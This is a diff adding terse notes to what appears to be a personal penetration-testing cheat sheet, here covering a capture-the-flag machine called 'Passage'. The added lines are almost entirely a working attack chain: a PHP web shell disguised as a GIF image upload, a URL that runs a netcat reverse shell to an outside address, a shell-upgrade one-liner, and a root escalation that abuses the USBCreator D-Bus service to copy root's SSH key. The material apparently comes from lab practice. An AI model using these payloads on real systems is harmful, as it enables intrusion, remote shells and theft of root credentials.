@@ -91,3 +91,23 @@ $credential.GetNetworkCredential().Password
 X11 exploit
 https://zachgrace.com/training/x11/
 
+
+Passage
+
+image.php file
+GIF8;                                                                                                                                                                                      
+<?php system($_REQUEST['cmd']) ?>
+
+10.10.10.206/CuteNews/uploads/avatar_abc123_image.php?cmd=nc 10.10.14.2 -e /bin/bash 1234
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+ssh -i id_rsa nadav@passage
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/getting_root/id_rsa 
+true 
+<.ubuntu.USBCreator.image /root/.ssh/id_rsa /tmp/getting_root/id_rsa true 
+()
+
+ssh -i id_rsa root@passage
+
+
